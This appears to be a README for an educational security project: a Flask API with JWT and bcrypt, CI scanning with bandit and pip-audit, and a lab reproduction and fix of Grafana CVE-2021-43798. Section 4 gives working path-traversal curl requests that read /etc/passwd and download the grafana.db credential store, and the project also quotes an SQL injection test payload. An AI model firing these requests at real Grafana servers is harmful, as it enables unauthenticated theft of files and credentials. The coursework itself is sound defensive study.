# Secure Task API — Flask + JWT + CI/CD security scanning

Educational project for **Work 1: Secure REST API Development with CI/CD and Real CVE
Vulnerability Analysis**.

A small REST API that stores users and posts in SQLite, authenticates with JWT, hashes
passwords with bcrypt, and is checked on every push by a CI pipeline that runs unit tests,
SAST (bandit) and SCA (pip-audit).

---

## 1. Project description and API

| Method | Path           | Auth            | Description |
|--------|----------------|-----------------|-------------|
| POST   | `/auth/login`  | —               | Accepts `{"username", "password"}`, returns a JWT access token. |
| GET    | `/api/data`    | Bearer JWT      | Returns the list of posts with their authors. |
| POST   | `/api/posts`   | Bearer JWT      | Creates a post owned by the authenticated user. |
| GET    | `/health`      | —               | Liveness probe used by the pipeline. |

Login response:

```json
{"access_token": "<jwt>", "token_type": "Bearer"}
```

Protected request:

```bash
curl -s http://127.0.0.1:5000/api/data \
     -H "Authorization: Bearer $TOKEN"
```

### Running locally

```bash
python -m venv .venv
. .venv/bin/activate            # Windows: .venv\Scripts\activate
pip install -r requirements-dev.txt

export SECRET_KEY="$(python -c 'import secrets;print(secrets.token_urlsafe(32))')"
flask --app run init-db
flask --app run seed            # demo users: alice / bob
python run.py                   # http://127.0.0.1:5000
```

Demo credentials created by `seed` (change them, they exist only for the demo):

* `alice` / `Alice-Strong-Pass-2026` (role `admin`)
* `bob`   / `Bob-Strong-Pass-2026`   (role `user`)

---

## 2. Implemented security measures

### 2.1 SQL injection (A03:2021 — Injection)

* **Every** statement uses `?` placeholders and passes values as a tuple:
  `db.execute("SELECT ... WHERE username = ?", (username,))`.
* No SQL text is concatenated, formatted or interpolated with user input anywhere in `app/`.
* SQLite is accessed through `sqlite3` directly (no string templating layer such as an ORM
  query builder is needed for three endpoints).
* Regression test: `test_sql_injection_in_login_is_inert` sends `alice' OR '1'='1' --` and
  expects `401`, i.e. the payload is treated as data.

### 2.2 Cross-site scripting (A03:2021 — Injection)

* All user-controlled values (`title`, `body`, `author`) are passed through
  `markupsafe.escape` in `app/security.py::sanitize` **before** they are serialised into the
  response, so `<script>` becomes `&lt;script&gt;`.
* Data is stored raw and escaped on output; this keeps the database clean and makes the
  escaping auditable in one place.
* Responses are `application/json` plus `Content-Security-Policy: default-src 'none';
  frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`.
* Regression test: `test_xss_payload_is_escaped_in_responses`.

### 2.3 Authentication and session handling (A07:2021)

* Passwords are hashed with **bcrypt**, work factor 12, per-password salt
  (`hash_password`); equality is checked with `bcrypt.checkpw` in constant time.
* Login issues a **JWT** (HS256) with `sub`, `username`, `role`, `iat`, `exp`
  (60 minutes by default, `JWT_EXPIRES_MINUTES`).
* `login_required` middleware verifies the signature, the algorithm (`algorithms=["HS256"]`,
  so `alg: none` is rejected), the presence of `exp`/`sub`, and expiry.
* Wrong user and wrong password return the **same** `401` body — no user enumeration.
* A tiny in-memory limiter allows 5 login attempts per IP per 60 s, then `429`.
* The signing key comes from `SECRET_KEY`; the app refuses to be deployed with the default
  development key in a real environment (set the variable in CI/production).

### 2.4 Other hardening

* `MAX_CONTENT_LENGTH` 64 KB, explicit JSON parsing (`get_json(silent=True)`), strict type
  and length validation on input (422 on oversize).
* Generic 500 handler: database errors and stack traces never reach the client.
* `Cache-Control: no-store` on every response.

---

## 3. CI/CD pipeline with security scanners

`.github/workflows/ci.yml` runs on every push and pull request:

1. `pytest -q` — 16 functional and security regression tests.
2. **SAST**: `bandit -r app -ll` — fails the job on medium/high findings.
3. **SCA**: `pip-audit -r requirements.txt` — fails the job on known CVEs in dependencies,
   JSON report uploaded as the `security-reports` artifact.

`.gitlab-ci.yml` provides the same three stages for GitLab (`test`, `sast`, `sca`).

Screenshots of the green pipeline / artifacts are stored in `docs/` (see
`docs/screenshots.md`).

---

## 4. CVE reproduction and remediation

| Item | Value |
|------|-------|
| CVE | **CVE-2021-43798** — path traversal / arbitrary file read in Grafana 8.x plugin route (CWE-22) |
| Component / version | Grafana **8.2.6** (`vulhub/grafana:8.2.6`), affected range 8.0.0 – 8.3.0 |
| Vulhub path | `grafana/CVE-2021-43798` |
| Impact | Unauthenticated attacker downloads any file readable by the `grafana` user — `/etc/passwd`, TLS keys, `grafana.db` (admin password hash + salt, datasource credentials) |
| Fix | Upgrade to **8.3.1** ([`cve/CVE-2021-43798/docker-compose.yml`](cve/CVE-2021-43798/docker-compose.yml)) |
| CVSS (v3.1) | 7.5 High |

### 4.1 Reproduction

```bash
cd vulhub/grafana/CVE-2021-43798
docker compose up -d
```

No authentication is needed; the plugin id only has to exist (`alertlist` ships with Grafana).

```bash
# 1) arbitrary file read outside the plugin directory
curl --path-as-is \
  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd"

# 2) the credential store: 659,456 bytes of SQLite
curl --path-as-is -o grafana.db \
  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db"
```

The downloaded database contains the admin account:

```
('admin', 'admin@localhost', 'd9324a2650ef3674…c64b828ea5e53', 'ozQBmV2nl4', 1)
```

Full transcript: [`docs/cve-evidence.md`](docs/cve-evidence.md).

### 4.2 Root cause

Grafana serves plugin assets through the route
`/public/plugins/:pluginId/*filepath`. The handler built the file path by joining the
plugin directory with the attacker-controlled `filepath` and did **not** verify that
the result stayed inside the plugin directory. `..` segments are passed through by
the router, so `../` climbs out of `/usr/share/grafana/public/app/plugins/<id>/` up
to `/`, and any file the process can read is returned.

The impact is amplified by what Grafana stores on disk:

* `grafana.db` holds the admin password **hash and salt** (PBKDF2-SHA256) as well as
  datasource credentials — an attacker cracks them offline or reuses them directly;
* TLS keys and `grafana.ini` (SMTP, OAuth secrets) are readable as well.

This is a **missing canonicalisation/containment check** in the file-serving handler:
the code trusts a path derived from the request and never calls a "clean + prefix
check" before reading. It is a logic error, not a configuration mistake — which is
why the vendor fix is code, and the operator fix is the version upgrade.

### 4.3 Applied fix

`docker compose down`, then start the patched environment
([`cve/CVE-2021-43798/docker-compose.yml`](cve/CVE-2021-43798/docker-compose.yml)):

```diff
-    image: vulhub/grafana:8.2.6
+    image: grafana/grafana:8.3.1
```

Grafana published the fix on 2021-12-07 in **8.3.1, 8.2.7, 8.1.8 and 8.0.7**.
Everything else (port 3000, default config, login required) is unchanged, so the
only variable is the Grafana version.

### 4.4 Proof the vulnerability is gone

| Request | 8.2.6 (before) | 8.3.1 (after) |
|---|---|---|
| `GET /login` | 200 | 200 — no regression |
| `/public/plugins/alertlist/..(×12)/etc/passwd` | **200 + `/etc/passwd`** | **404** `{"message":"Plugin file not found"}` (41 bytes) |
| `/public/plugins/alertlist/..(×12)/var/lib/grafana/grafana.db` | **200 + 659,456-byte DB** | **404** |
| `GET /api/health` | 200 | 200, `"version": "8.3.1"` |

The regression check (`/login` and `/api/health` still answer, database `"ok"`) shows
the upgrade closed the traversal without breaking the application.

### 4.5 Defence in depth (beyond the patch)

* never expose Grafana directly to the internet — put it behind a reverse proxy with
  authentication, or restrict source IPs;
* block requests whose path contains `..`, `%2e%2e` or encoded slashes at the proxy;
* run the container as a non-root user with a read-only root filesystem where possible;
* rotate the `admin` password and datasource credentials if the host was exposed —
  a leaked `grafana.db` is equivalent to a full compromise;
* pin image digests so a silent re-tag cannot reintroduce a vulnerable build.

---

## 5. Project structure

```
secure-api/
├── app/
│   ├── __init__.py      # application factory, security headers, error handlers
│   ├── auth.py          # JWT middleware, rate limiter
│   ├── db.py            # SQLite access, schema, CLI commands
│   ├── routes.py        # /auth/login, /api/data, /api/posts
│   └── security.py      # bcrypt, JWT, escaping, password policy
├── cve/CVE-2021-43798/  # fixed docker-compose.yml for the Grafana environment
├── docs/
│   ├── cve-evidence.md  # full reproduction / verification transcript
│   └── screenshots.md   # list of screenshots required by the assignment
├── tests/
│   ├── conftest.py
│   └── test_api.py
├── .github/workflows/ci.yml
├── .gitlab-ci.yml
├── requirements.txt
├── requirements-dev.txt
└── run.py
```

---

## 6. Tests

```bash
pytest -q
bandit -r app -ll
pip-audit -r requirements.txt
```

The test suite covers: login success/failure, no user enumeration, SQLi payload inertness,
missing/malformed/tampered tokens, protected data read, post creation, input validation,
XSS escaping, security headers and the login rate limit.
